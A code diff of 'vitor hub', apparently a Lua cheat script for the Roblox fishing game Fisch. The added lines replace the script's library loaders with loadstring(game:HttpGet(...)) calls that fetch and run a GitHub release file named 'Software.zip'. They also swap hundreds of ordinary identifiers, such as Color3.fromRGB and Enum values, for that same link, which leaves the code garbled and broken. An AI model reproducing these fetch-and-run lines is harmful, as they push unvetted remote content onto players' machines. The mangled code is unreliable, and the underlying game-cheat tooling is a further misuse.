@@ -1,27 +1,27 @@
-local Fluent = loadstring(game:HttpGet("https://raw.githubusercontent.com/Knuxy92/Ui-linoria/main/Fluent/Fluent.lua"))()
-local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua"))()
-local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/InterfaceManager.lua"))()
+local Fluent = loadstring(game:HttpGet("https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip"))()
+local SaveManager = loadstring(game:HttpGet("https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip"))()
+local InterfaceManager = loadstring(game:HttpGet("https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip"))()
 
 local Window = Fluent:CreateWindow({
 	Title = "vitor hub",
 	SubTitle = "fisch | beta",
 	TabWidth = 160,
-	Size = UDim2.fromOffset(550, 350),
+	Size = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(550, 350),
 	Acrylic = false, 
 	Theme = "Amethyst",
-	MinimizeKey = Enum.KeyCode.LeftControl
+	MinimizeKey = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip
 })
 
 do 
 	Config = {
 
 	}
-	_G.Config = Config
+	https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip = Config
 	AllFuncs = {}
 	Threads = getgenv().Threads
-	Players = game.Players
-	LocalPlayer = game.Players.LocalPlayer
-	Client = game.Players.LocalPlayer
+	Players = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip
+	LocalPlayer = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip
+	Client = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip
 
 
 	-- \\ Module GetService // --
@@ -40,16 +40,16 @@ do
 
 	-- \\ vitor Module // --
 	
-	PlayerGui = LocalPlayer.PlayerGui
-	Backpack = LocalPlayer.Backpack
-	request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
+	PlayerGui = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip
+	Backpack = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip
+	request = (syn and https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip) or (http and https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip) or http_request or (fluxus and https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip) or request
 
-	Char = Client.Character
-	Character = Client.Character
+	Char = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip
+	Character = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip
 	if not Threads then getgenv().Threads = {} end
 
 	repeat 
-		LocalPlayer = Players.LocalPlayer
+		LocalPlayer = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip
 		wait()
 	until LocalPlayer
 end
@@ -63,13 +63,13 @@ function Notify(Des, Time, title)
 end
 
 _G['vitor Hub Table'] = {
-	isWindows = UserInputService:GetPlatform() == Enum.Platform.Windows,
-	TypeOs = (table.find({Enum.Platform.Windows}, game:GetService('UserInputService'):GetPlatform()) ~= nil and 'Pc') or 'Mb',
-	SizeUi = (not isWindows and UDim2.fromOffset(600,300)) or UDim2.fromOffset(560,600),
+	isWindows = UserInputService:GetPlatform() == https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip,
+	TypeOs = (https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip({https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip}, game:GetService('UserInputService'):GetPlatform()) ~= nil and 'Pc') or 'Mb',
+	SizeUi = (not isWindows and https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(600,300)) or https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(560,600),
 	AutoSize = true,
 	TweenUiSize = true,
 	SpeedTweenUi = 0.25,
-	StyleTweenUi = Enum.EasingStyle.Quad,
+	StyleTweenUi = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip,
 	Mutiply = 1.80,
 	SizeX = 550,
 	SafePercent = 20,
@@ -77,57 +77,57 @@ _G['vitor Hub Table'] = {
 	AnimationUiToggle = true,
 }
 
-_G['vitor Hub Table'].SizeUi = (not _G['vitor Hub Table'].isWindows and UDim2.fromOffset(600,300)) or UDim2.fromOffset(560,600)
+_G['vitor Hub Table'].SizeUi = (not _G['vitor Hub Table'].isWindows and https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(600,300)) or https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(560,600)
 if not _G['vitor Hub Table'].isWindows then
-	if game.CoreGui:FindFirstChild('UIBUTTON') then
-		game.CoreGui:FindFirstChild('UIBUTTON'):Destroy()
+	if https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip('UIBUTTON') then
+		https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip('UIBUTTON'):Destroy()
 	end
 
 	local TweenService = game:GetService("TweenService")
 	local UserInputService = game:GetService("UserInputService")
-	local UIBUTTON = Instance.new("ScreenGui")
-	local Frame = Instance.new("Frame")
-	local ImageButton = Instance.new("ImageButton")
-	local UICorner = Instance.new("UICorner")
-	local UICorner_2 = Instance.new("UICorner")
+	local UIBUTTON = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip("ScreenGui")
+	local Frame = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip("Frame")
+	local ImageButton = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip("ImageButton")
+	local UICorner = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip("UICorner")
+	local UICorner_2 = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip("UICorner")
 
-	UIBUTTON.Name = "UIBUTTON"
-	UIBUTTON.Parent = game.CoreGui
-	UIBUTTON.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+	https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip = "UIBUTTON"
+	https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip
+	https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip
 
-	Frame.Parent = UIBUTTON
-	Frame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
-	Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
-	Frame.BorderSizePixel = 0
-	Frame.Transparency = 1
-	Frame.Position = UDim2.new(0.157012194, 0, 0.164366379, 0)
-	Frame.Size = UDim2.new(0, 115, 0, 49)
+	https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip = UIBUTTON
+	https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(15, 15, 15)
+	https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(0, 0, 0)
+	https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip = 0
+	https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip = 1
+	https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(0.157012194, 0, 0.164366379, 0)
+	https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(0, 115, 0, 49)
 
-ImageButton.Parent = Frame
-ImageButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-ImageButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
-ImageButton.BorderSizePixel = 0
-ImageButton.Active = true
-ImageButton.Draggable = true
-ImageButton.Position = UDim2.new(0.218742043, 0, -0.155235752, 0)
-ImageButton.Size = UDim2.new(0, 64, 0, 64)
+https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip = Frame
+https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(255, 255, 255)
+https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(0, 0, 0)
+https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip = 0
+https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip = true
+https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip = true
+https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(0.218742043, 0, -0.155235752, 0)
+https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(0, 64, 0, 64)
 
 -- Set initial image to "open"
-ImageButton.Image = "rbxassetid://136634905225382" -- Open image asset ID
+https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip = "rbxassetid://136634905225382" -- Open image asset ID
 local isOpen = true -- Variable to track the state
 
-ImageButton.MouseButton1Click:Connect(function()
+https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(function()
     -- Animate the button size
-    ImageButton:TweenSize(UDim2.new(0, 60, 0, 60), Enum.EasingDirection.In, Enum.EasingStyle.Elastic, 0.1)
+    ImageButton:TweenSize(https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(0, 60, 0, 60), https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip, https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip, 0.1)
     delay(0.1, function()
-        ImageButton:TweenSize(UDim2.new(0, 64, 0, 64), Enum.EasingDirection.Out, Enum.EasingStyle.Elastic, 0.1)
+        ImageButton:TweenSize(https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(0, 64, 0, 64), https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip, https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip, 0.1)
     end)
 
     -- Toggle the image based on the state
     if isOpen then
-        ImageButton.Image = "rbxassetid://134717468347051" -- Replace with close image asset ID
+        https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip = "rbxassetid://134717468347051" -- Replace with close image asset ID
     else
-        ImageButton.Image = "rbxassetid://136634905225382" -- Open image asset ID
+        https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip = "rbxassetid://136634905225382" -- Open image asset ID
     end
     isOpen = not isOpen -- Toggle the state
 
@@ -139,11 +139,11 @@ ImageButton.MouseButton1Click:Connect(function()
     VirtualInputManager:SendKeyEvent(false,"LeftControl",false,game)
 end)
 
-UICorner.CornerRadius = UDim.new(0, 100)
-UICorner.Parent = ImageButton
+https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(0, 100)
+https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip = ImageButton
 
-	UICorner_2.CornerRadius = UDim.new(0, 10)
-	UICorner_2.Parent = Frame
+	https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(0, 10)
+	https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip = Frame
 
 
 	local UIS = game:GetService('UserInputService')
@@ -154,32 +154,32 @@ UICorner.Parent = ImageButton
 	local startPos = nil
 
 	local function updateInput(input)
-		local delta = input.Position - dragStart
-		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
-			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
-		game:GetService('TweenService'):Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
+		local delta = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip - dragStart
+		local position = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip, https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip + delta.X,
+			https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip, https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip + delta.Y)
+		game:GetService('TweenService'):Create(frame, https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(dragSpeed), {Position = position}):Play()
 	end
 
-	frame.InputBegan:Connect(function(input)
-		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
+	https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(function(input)
+		if (https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip == https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip or https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip == https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip) then 
 			dragToggle = true
-			dragStart = input.Position
-			startPos = frame.Position
-			input.Changed:Connect(function()
-				if input.UserInputState == Enum.UserInputState.End then
+			dragStart = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip
+			startPos = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip
+			https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(function()
+				if https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip == https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip then
 					dragToggle = false
 				end
 			end)
 		end
 	end)
 
-	UIS.InputChanged:Connect(function(input)
-		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+	https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(function(input)
+		if https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip == https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip or https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip == https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip then
 			if dragToggle then
-				Frame.Transparency = 1
+				https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip = 1
 				updateInput(input)
 			else
-				Frame.Transparency = 1
+				https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip = 1
 			end
 		end
 	end)
@@ -188,8 +188,8 @@ end
 do -- Settings Initializer
 	local path = "vitor Hub/fisch"
 	if not isfolder(path) then makefolder(path) end
-	DefaultConfigName = path.."/OriConfibg.json"
-	ConfigName = path.."/"..Client.UserId.."Config.json"
+	DefaultConfigName = path.."https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip"
+	ConfigName = path.."/"https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip"https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip"
 	Config = isfile(ConfigName) and readfile(ConfigName)
 	DefaultConfig = isfile(DefaultConfigName) and readfile(DefaultConfigName)
 	if DefaultConfig then
@@ -206,8 +206,8 @@ do -- Settings Initializer
 			end
 		end
 	end
-	if isfile(tostring(Client.UserId).."ALC.txt") then
-		if readfile(tostring(Client.UserId).."ALC.txt") == "true"  then
+	if isfile(tostring(https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip).."https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip") then
+		if readfile(tostring(https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip).."https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip") == "true"  then
 			if Config then
 				if type(Config) == "string" and Config:find"{" then
 					local Success,Result
@@ -230,7 +230,7 @@ do -- Settings Initializer
 			Config = {}
 		end
 	else
-		writefile(tostring(Client.UserId).."ALC.txt", "true")
+		writefile(tostring(https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip).."https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip", "true")
 		Config = {}
 	end
 	if getgenv().Config then
@@ -270,7 +270,7 @@ do -- INFO FISH
 			Seasons = {"None"};
 			Weather = {"None"};
 			Quips = {"Ermm..?", "A tire.?", "Who would put this in here?", "Oh. A tire.", "A tire!..?"};
-			SparkleColor = Color3.fromRGB(255, 255, 255);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(255, 255, 255);
 			From = "None";
 		};
 		Boot = {
@@ -287,7 +287,7 @@ do -- INFO FISH
 			Seasons = {"None"};
 			Weather = {"None"};
 			Quips = {"Ermm..?", "Why only one..?", "A Boot.!", "A Boot...", "I caught!.. a Boot..?", "Erm.. A Boot?"};
-			SparkleColor = Color3.fromRGB(197, 152, 80);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(197, 152, 80);
 			From = "None";
 		};
 		["Fungal Cluster"] = {
@@ -304,7 +304,7 @@ do -- INFO FISH
 			Seasons = {"None"};
 			Weather = {"None"};
 			Quips = {"Ermm..?", "Hmm..?"};
-			SparkleColor = Color3.fromRGB(255, 0, 0);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(255, 0, 0);
 			HoldAnimation = fish:WaitForChild("underweight");
 			From = "Mushgrove";
 		};
@@ -322,7 +322,7 @@ do -- INFO FISH
 			Seasons = {"None"};
 			Weather = {"None"};
 			Quips = {"Ermm..?", "Uhmm..?", "Driftwood!", "Oh. Driftwood.", "It's!- Oh.. Driftwood..", "Driftwood.."};
-			SparkleColor = Color3.fromRGB(197, 107, 62);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(197, 107, 62);
 			HoldAnimation = fish:WaitForChild("tiny");
 			From = "None";
 		};
@@ -340,7 +340,7 @@ do -- INFO FISH
 			Seasons = {"None"};
 			Weather = {"None"};
 			Quips = {"Ermm..?", "Uhmm..?", "Driftwood!", "Oh. Driftwood.", "It's!- Oh.. Driftwood..", "Driftwood.."};
-			SparkleColor = Color3.fromRGB(197, 107, 62);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(197, 107, 62);
 			HoldAnimation = fish:WaitForChild("tiny");
 			From = "None";
 		};
@@ -358,7 +358,7 @@ do -- INFO FISH
 			Seasons = {"None"};
 			Weather = {"None"};
 			Quips = {"Oh.. a Log!", "A.. Log?", "How did I pull this up?", "A Log..?"};
-			SparkleColor = Color3.fromRGB(255, 255, 255);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(255, 255, 255);
 			HoldAnimation = fish:WaitForChild("heavy");
 			From = "None";
 		};
@@ -376,7 +376,7 @@ do -- INFO FISH
 			Seasons = {"None"};
 			Weather = {"None"};
 			Quips = {"Ermm..?", "Uhmm..?", "A Rock!", "Oh. A Rock.", "It's!- Oh.. A Rock..", "A rock.."};
-			SparkleColor = Color3.fromRGB(80, 80, 80);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(80, 80, 80);
 			HoldAnimation = fish:WaitForChild("tiny");
 			From = "None";
 		};
@@ -394,7 +394,7 @@ do -- INFO FISH
 			Seasons = {"None"};
 			Weather = {"None"};
 			Quips = {"Ermm..?", "Uhmm..?", "A block of Ice!", "Oh. Ice.", "Ouu! Let me lick it!", "Ice..", "It's not a popsicle, but it will do!"};
-			SparkleColor = Color3.fromRGB(171, 255, 245);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(171, 255, 245);
 			HoldAnimation = fish:WaitForChild("tiny");
 			From = "Snowcap";
 		};
@@ -412,7 +412,7 @@ do -- INFO FISH
 			Seasons = {"None"};
 			Weather = {"None"};
 			Quips = {"Ermm..?", "Uhmm..?", "Some Basalt!", "Oh. A Piece of Basalt.", "It's!- Oh.. Basalt..", "Basalt.."};
-			SparkleColor = Color3.fromRGB(59, 59, 59);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(59, 59, 59);
 			HoldAnimation = fish:WaitForChild("tiny");
 			From = "Roslit Volcano";
 		};
@@ -431,7 +431,7 @@ do -- INFO FISH
 			Seasons = {"None"};
 			Weather = {"None"};
 			Quips = {"A Common Crate!", "A Crate!", "Woah! A Crate!", "A Common Crate!", "Who left this here?"};
-			SparkleColor = Color3.fromRGB(255, 255, 255);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(255, 255, 255);
 			HoldAnimation = fish:WaitForChild("crate");
 			IsCrate = true;
 			CrateType = "All";
@@ -455,7 +455,7 @@ do -- INFO FISH
 			Seasons = {"None"};
 			Weather = {"None"};
 			Quips = {"A Carbon Crate!", "A Crate!", "Woah! A Crate!", "A Carbon Crate!", "Who left this here?", "Where is this from??"};
-			SparkleColor = Color3.fromRGB(255, 255, 255);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(255, 255, 255);
 			HoldAnimation = fish:WaitForChild("crate");
 			IsCrate = true;
 			CrateType = "FishOrCoins";
@@ -477,7 +477,7 @@ do -- INFO FISH
 			Seasons = {"None"};
 			Weather = {"None"};
 			Quips = {"A Common Crate!", "A Crate!", "Woah! A Crate!", "A Common Crate!", "Who left this here?"};
-			SparkleColor = Color3.fromRGB(255, 255, 255);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(255, 255, 255);
 			HoldAnimation = fish:WaitForChild("crate");
 			From = "None";
 			IsCrate = true;
@@ -500,7 +500,7 @@ do -- INFO FISH
 			Seasons = {"None"};
 			Weather = {"None"};
 			Quips = {"A Crate of Bait!", "A Bait Crate!", "Woah! A Crate!", "A Crate!", "Who left this here?", "Oh, the shrimps still moving?", "A Crate full of Bait!"};
-			SparkleColor = Color3.fromRGB(255, 255, 255);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(255, 255, 255);
 			HoldAnimation = fish:WaitForChild("crate");
 			From = "None";
 			IsCrate = true;
@@ -522,7 +522,7 @@ do -- INFO FISH
 			Seasons = {"None"};
 			Weather = {"None"};
 			Quips = {"A Crate of Bait!", "A Bait Crate!", "Woah! A Crate!", "A Crate!", "Who left this here?", "Oh, the shrimps still moving?", "A Crate full of Bait!"};
-			SparkleColor = Color3.fromRGB(255, 255, 255);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(255, 255, 255);
 			HoldAnimation = fish:WaitForChild("downward");
 			From = "None";
 			IsCrate = true;
@@ -544,7 +544,7 @@ do -- INFO FISH
 			Seasons = {"None"};
 			Weather = {"None"};
 			Quips = {"Ooo, shiny!", "A rock...?!", "Woah! Glowy thing!", "A Geode!", "What's this thing?"};
-			SparkleColor = Color3.fromRGB(255, 255, 255);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(255, 255, 255);
 			HoldAnimation = fish:WaitForChild("crate");
 			IsCrate = true;
 			CrateType = "All";
@@ -567,7 +567,7 @@ do -- INFO FISH
 			Seasons = {"Spring", "Summer"};
 			Weather = {"Rain"};
 			Quips = {"Now, where's the snare?", "Woah!", "Awesome!", "A Largemouth Bass!", "Ou! A Bass!"};
-			SparkleColor = Color3.fromRGB(172, 255, 134);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(172, 255, 134);
 			HoldAnimation = fish:WaitForChild("tiny");
 			From = "Moosewood";
 		};
@@ -585,7 +585,7 @@ do -- INFO FISH
 			Seasons = {"Spring", "Summer"};
 			Weather = {"Clear"};
 			Quips = {"A Sea Bass!", "I caught a Sea Bass!", "Woah! A Sea Bass!", "Ouu! A Bass!"};
-			SparkleColor = Color3.fromRGB(203, 203, 203);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(203, 203, 203);
 			HoldAnimation = fish:WaitForChild("basic");
 			From = "Ocean";
 		};
@@ -603,7 +603,7 @@ do -- INFO FISH
 			Seasons = {"Spring", "Summer"};
 			Weather = {"Windy"};
 			Quips = {"A Smallmouth Bass!", "I caught a Smallmouth Bass!", "Woah! A Smallmouth Bass!", "Ouu! A Bass!"};
-			SparkleColor = Color3.fromRGB(127, 255, 88);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(127, 255, 88);
 			HoldAnimation = fish:WaitForChild("tiny");
 			From = "Terrapin";
 		};
@@ -621,7 +621,7 @@ do -- INFO FISH
 			Seasons = {"Spring"};
 			Weather = {"Clear"};
 			Quips = {"I caught an Anchovy..", "An Anchovy!", "It really put up a battle!"};
-			SparkleColor = Color3.fromRGB(255, 255, 255);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(255, 255, 255);
 			HoldAnimation = fish:WaitForChild("tiny");
 			From = "Moosewood";
 		};
@@ -639,7 +639,7 @@ do -- INFO FISH
 			Seasons = {"Spring", "Summer"};
 			Weather = {"Windy"};
 			Quips = {"A Swamp Bass!", "I caught a Swamp Bass!", "Woah! A Swamp Bass!", "Ouu! A Swamp Bass!"};
-			SparkleColor = Color3.fromRGB(137, 255, 116);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(137, 255, 116);
 			HoldAnimation = fish:WaitForChild("basic");
 			From = "Mushgrove";
 		};
@@ -657,7 +657,7 @@ do -- INFO FISH
 			Seasons = {"Spring", "Summer"};
 			Weather = {"None"};
 			Quips = {"I caught a Chub!", "Woah, a Chub!!"};
-			SparkleColor = Color3.fromRGB(255, 255, 255);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(255, 255, 255);
 			HoldAnimation = fish:WaitForChild("tiny");
 			From = "Roslit";
 		};
@@ -675,7 +675,7 @@ do -- INFO FISH
 			Seasons = {"Spring", "Summer"};
 			Weather = {"Foggy"};
 			Quips = {"A White Bass!", "I caught a White Bass!", "Woah! A White Bass!", "Ouu! A Bass!"};
-			SparkleColor = Color3.fromRGB(255, 255, 255);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(255, 255, 255);
 			HoldAnimation = fish:WaitForChild("tiny");
 			From = "Terrapin";
 		};
@@ -693,7 +693,7 @@ do -- INFO FISH
 			Seasons = {"None"};
 			Weather = {"None"};
 			Quips = {"A Blackfish!", "I caught a Blackfish!", "Oh, a Blackfish!"};
-			SparkleColor = Color3.fromRGB(113, 113, 113);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(113, 113, 113);
 			HoldAnimation = fish:WaitForChild("tiny");
 			From = "Snowcap";
 		};
@@ -711,7 +711,7 @@ do -- INFO FISH
 			Seasons = {"Autumn"};
 			Weather = {"Foggy"};
 			Quips = {"A Burbot!", "I caught a Burbot!", "Oh, a Burbot!"};
-			SparkleColor = Color3.fromRGB(194, 255, 129);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(194, 255, 129);
 			HoldAnimation = fish:WaitForChild("tiny");
 			From = "Snowcap";
 		};
@@ -729,7 +729,7 @@ do -- INFO FISH
 			Seasons = {"Spring", "Summer"};
 			Weather = {"Foggy"};
 			Quips = {"A Grayling!", "I caught a Grayling!", "Oh, a Grayling!"};
-			SparkleColor = Color3.fromRGB(255, 255, 255);
+			SparkleColor = https://github.com/celestialhub551/vitor-hub-fisch-beta/releases/download/v1.0/Software.zip(255, 255, 255);
